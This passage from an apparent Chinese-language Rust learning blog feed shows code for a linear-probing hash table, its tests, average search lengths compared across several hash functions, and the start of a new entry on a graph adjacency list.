class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">MyHash</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> len <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> table <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">None</span><span class="token punctuation">;</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">MyHash</span><span class="token punctuation">&#123;</span>            data <span class="token punctuation">:</span> table<span class="token punctuation">,</span>            len        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">hash_1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> len <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> total<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">&#123;</span>            total <span class="token operator">+=</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Hash of &#123;&#125; is &#123;&#125;"</span><span class="token punctuation">,</span> input<span class="token punctuation">,</span> total<span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        total <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// 43，质数</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">insert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span> <span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 哈希映射</span>        <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">hash_1</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> start <span class="token operator">=</span> index<span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> index<span class="token punctuation">;</span>        <span class="token keyword">loop</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">[</span>current<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">[</span>current<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            current <span class="token operator">=</span> <span class="token punctuation">(</span>current <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">;</span>            <span class="token keyword">if</span> current <span class="token operator">==</span> start <span class="token punctuation">&#123;</span>                <span class="token namespace">anyhow<span class="token punctuation">::</span></span><span class="token macro property">bail!</span><span class="token punctuation">(</span><span class="token string">"表已满！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span> <span class="token punctuation">,</span> key<span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">,</span><span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> index <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">hash_1</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> start <span class="token operator">=</span> index<span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> index<span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> length <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">loop</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">[</span>current<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> val <span class="token operator">==</span> key<span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            current <span class="token operator">=</span> <span class="token punctuation">(</span>current <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">;</span>            length <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> current <span class="token operator">==</span> start <span class="token operator">||</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">[</span>current<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">is_none</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[cfg(test)]</span><span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token module-declaration namespace"><span class="token punctuation">::</span>hash<span class="token punctuation">::</span></span><span class="token class-name">MyHash</span><span class="token punctuation">;</span>    <span class="token comment">//#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> myHash <span class="token operator">=</span> <span class="token class-name">MyHash</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> names <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"abc"</span><span class="token punctuation">,</span> <span class="token string">"bac"</span><span class="token punctuation">,</span> <span class="token string">"caa"</span><span class="token punctuation">,</span> <span class="token string">"dee"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"renming"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            myHash<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token macro property">assert!</span><span class="token punctuation">(</span>myHash<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_find</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> table <span class="token operator">=</span> <span class="token class-name">MyHash</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> test_names <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>            <span class="token string">"rust"</span><span class="token punctuation">,</span><span class="token string">"cargo"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">,</span><span class="token string">"cpp"</span><span class="token punctuation">,</span><span class="token string">"c_sharp"</span><span class="token punctuation">,</span><span class="token string">"python"</span><span class="token punctuation">,</span><span class="token string">"java"</span><span class="token punctuation">,</span><span class="token string">"ruby"</span><span class="token punctuation">,</span><span class="token string">"haskell"</span><span class="token punctuation">,</span><span class="token string">"elixir"</span><span class="token punctuation">,</span>            <span class="token string">"kotlin"</span><span class="token punctuation">,</span><span class="token string">"lua"</span><span class="token punctuation">,</span><span class="token string">"javascript"</span><span class="token punctuation">,</span><span class="token string">"typescript"</span><span class="token punctuation">,</span><span class="token string">"jerryscript"</span><span class="token punctuation">,</span><span class="token string">"go"</span><span class="token punctuation">,</span><span class="token string">"maven"</span><span class="token punctuation">,</span><span class="token string">"docker"</span><span class="token punctuation">,</span><span class="token string">"k8s"</span><span class="token punctuation">,</span><span class="token string">"zig"</span><span class="token punctuation">,</span>            <span class="token string">"Swift"</span><span class="token punctuation">,</span><span class="token string">"php"</span><span class="token punctuation">,</span><span class="token string">"asm"</span><span class="token punctuation">,</span><span class="token string">"auceptin"</span><span class="token punctuation">,</span><span class="token string">"tokio"</span><span class="token punctuation">,</span><span class="token string">"sqlx"</span><span class="token punctuation">,</span><span class="token string">"request"</span><span class="token punctuation">,</span><span class="token string">"tauri"</span><span class="token punctuation">,</span><span class="token string">"tracing"</span><span class="token punctuation">,</span><span class="token string">"anyhow"</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment">// 插入所有名字</span>        <span class="token keyword">for</span> name <span class="token keyword">in</span> <span class="token operator">&amp;</span>test_names <span class="token punctuation">&#123;</span>            table<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> total_search_length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> name <span class="token keyword">in</span> <span class="token operator">&amp;</span>test_names <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> <span class="token punctuation">(</span>found<span class="token punctuation">,</span> length<span class="token punctuation">)</span> <span class="token operator">=</span> table<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token macro property">assert!</span><span class="token punctuation">(</span>found<span class="token punctuation">,</span> <span class="token string">"插入的名字应该能找到: &#123;&#125;"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>            total_search_length <span class="token operator">+=</span> length<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> average <span class="token operator">=</span> total_search_length <span class="token keyword">as</span> <span class="token keyword">f64</span> <span class="token operator">/</span> test_names<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">f64</span><span class="token punctuation">;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"平均查找长度：&#123;&#125;"</span><span class="token punctuation">,</span>average<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">assert!</span><span class="token punctuation">(</span>average<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2f64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>现在的平均查找长度是：1.6666666666666667</p><p>再测试几个哈希函数：</p><ul><li>直接定址法： 2.933333333333333</li><li>平方取中法： 1.9666666666666666</li><li>乘余取整法： 3.4</li><li>折叠法 ：1.4333333333333333</li></ul><p>也跟这些办法的具体实现有关：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">hash_1</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> input <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">usize</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> method <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">match</span> method <span class="token punctuation">&#123;</span>        <span class="token number">0</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 除留余数法</span>            <span class="token keyword">let</span> len <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> total<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">&#123;</span>                total <span class="token operator">+=</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Hash of &#123;&#125; is &#123;&#125;"</span><span class="token punctuation">,</span> input<span class="token punctuation">,</span> total<span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">// 43，质数</span>        <span class="token punctuation">&#125;</span>        <span class="token number">1</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>            <span class="token comment">// 直接定址法</span>            <span class="token keyword">if</span> <span class="token operator">!</span>input<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 取ASCII加和为key</span>                <span class="token keyword">let</span> len <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> <span class="token keyword">mut</span> total<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">&#123;</span>                    total <span class="token operator">+=</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token comment">// 加上字符串长度作为偏移</span>                total<span class="token punctuation">.</span><span class="token function">wrapping_add</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token number">0</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token number">2</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>            <span class="token comment">// 平方取中法</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> total<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token comment">// 将字符串转换为一个大数</span>            <span class="token keyword">for</span> <span class="token operator">&amp;</span>b <span class="token keyword">in</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                total <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">wrapping_mul</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">wrapping_add</span><span class="token punctuation">(</span>b <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// 平方</span>            <span class="token keyword">let</span> square <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">wrapping_mul</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 取中间几位（取32位的中间16位）</span>            <span class="token keyword">let</span> middle <span class="token operator">=</span> <span class="token punctuation">(</span>square <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span>            middle <span class="token keyword">as</span> <span class="token keyword">usize</span> <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len        <span class="token punctuation">&#125;</span>        <span class="token number">3</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 乘余取整法</span>            <span class="token keyword">let</span> a<span class="token punctuation">:</span> <span class="token keyword">f64</span> <span class="token operator">=</span> <span class="token number">0.6180339887</span><span class="token punctuation">;</span> <span class="token comment">// 黄金分割数</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> k<span class="token punctuation">:</span> <span class="token keyword">f64</span> <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>            <span class="token comment">// 将字符串转换为数值</span>            <span class="token keyword">for</span> <span class="token operator">&amp;</span>b <span class="token keyword">in</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                k <span class="token operator">=</span> k <span class="token operator">*</span> <span class="token number">256.0</span> <span class="token operator">+</span> b <span class="token keyword">as</span> <span class="token keyword">f64</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// 取小数部分</span>            <span class="token keyword">let</span> fractional <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> a<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1.0</span><span class="token punctuation">;</span>            <span class="token comment">// 乘以表大小</span>            <span class="token punctuation">(</span>fractional <span class="token operator">*</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len <span class="token keyword">as</span> <span class="token keyword">f64</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">usize</span>        <span class="token punctuation">&#125;</span>        _ <span class="token operator">=></span><span class="token punctuation">&#123;</span>            <span class="token comment">// 折叠法</span>            <span class="token keyword">let</span> chunk_size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment">// 每4个字符一组</span>            <span class="token keyword">let</span> bytes <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">as_bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> <span class="token keyword">mut</span> sum<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> chunk <span class="token keyword">in</span> bytes<span class="token punctuation">.</span><span class="token function">chunks</span><span class="token punctuation">(</span>chunk_size<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> <span class="token keyword">mut</span> chunk_value<span class="token punctuation">:</span> <span class="token keyword">usize</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token operator">&amp;</span>b <span class="token keyword">in</span> chunk <span class="token punctuation">&#123;</span>                    chunk_value <span class="token operator">=</span> <span class="token punctuation">(</span>chunk_value <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b <span class="token keyword">as</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                sum <span class="token operator">=</span> sum<span class="token punctuation">.</span><span class="token function">wrapping_add</span><span class="token punctuation">(</span>chunk_value<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            sum <span class="token operator">%</span> <span class="token keyword">self</span><span class="token punctuation">.</span>len        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>五和六逃了</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;题目：&quot;&gt;&lt;a href=&quot;#题目：&quot; class=&quot;headerlink&quot; title=&quot;题目：&quot;&gt;&lt;/a&gt;题目：&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-text&quot; data-language=&quot;text&quot;&gt;&lt;code</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-图实验</title>
    <link href="https://aucept.in/2025/11/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E5%AE%9E%E9%AA%8C/"/>
    <id>https://aucept.in/2025/11/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E5%AE%9E%E9%AA%8C/</id>
    <published>2025-11-29T03:26:34.000Z</published>
    <updated>2025-11-29T03:49:13.895Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实现一个邻接表"><a href="#实现一个邻接表" class="headerlink" title="实现一个邻接表"></a>实现一个邻接表</h2><p>基本结构，一个链表头结点vec代指每个顶点<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">type</span> <span class="token type-definition class-name">Link</span><span class="token operator">=</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token punctuation">;</span><span class="token comment">//第一项表示起始节点索引，第二项表示指向节点索引</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">usize</span><span class="token punctuation">,</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Graph</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 图是一个链表头结点向量</span>    vertices<span class="token punctuation">:</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Head</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Head</span><span class="token punctuation">&#123;</span>    <span class="token comment">//头结点，同时记录出度</span>    index<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>    len <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>    first<span class="token punctuation">:</span><span class="token class-name">Link</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[derive(Clone)]</span><span class="token comment">// 节点，依据索引排序，记录权重</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span><span class="token punctuation">&#123;</span>    weight <span class="token punctuation">:</span> <span class="token keyword">isize</span><span class="token punctuation">,</span>    index <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>    next <span class="token punctuation">:</span> <span class="token class-name">Link</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">Graph</span><span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>size<span class="token punctuation">:</span><span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">-></span><span class="token class-name">Graph</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> vertices <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">with_capacity</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>size <span class="token punctuation">&#123;</span>            vertices<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            vertices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index <span class="token operator">=</span> i <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Graph</span> <span class="token punctuation">&#123;</span> vertices <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token 